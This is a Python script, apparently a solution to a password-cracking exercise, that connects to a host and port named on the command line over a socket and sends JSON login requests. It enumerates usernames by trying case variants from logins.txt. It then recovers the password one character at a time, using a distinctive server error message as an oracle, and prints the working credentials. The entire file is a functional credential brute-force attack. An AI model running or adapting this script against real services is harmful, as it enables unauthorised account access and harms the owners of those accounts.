import json
from itertools import product
from socket import socket
from string import ascii_letters, digits
from sys import argv


def dictionary_generator(login_list):
    for login in login_list:
        variations = ((x, y) if x != y else (x,) for (x, y) in zip(login, login.upper()))
        for variant in product(*variations):
            yield ''.join(variant)


def find_login(client_socket, login_list):
    for candidate in dictionary_generator(login_list):
        req = json.dumps({'login': candidate, 'password': 'pass'})
        client_socket.sendall(req.encode())
        res = json.loads(client_socket.recv(1024).decode())
        if res['result'] != 'Wrong login!':
            return candidate
    return None


def find_password(client_socket, login):
    password = ''
    while True:
        for c in ascii_letters + digits:
            candidate = password + c
            req = json.dumps({'login': login, 'password': candidate})
            client_socket.sendall(req.encode())
            res = json.loads(client_socket.recv(1024).decode())
            if (result := res['result']) == 'Exception happened during login':
                password = candidate
                break
            elif result == 'Connection success!':
                return req


def main():
    with open('logins.txt') as file:
        login_list = file.read().splitlines()
    hostname, port = argv[1:]
    address = (hostname, int(port))
    with socket() as client:
        client.connect(address)
        login = find_login(client, login_list)
        print(find_password(client, login))


if __name__ == '__main__':
    main()
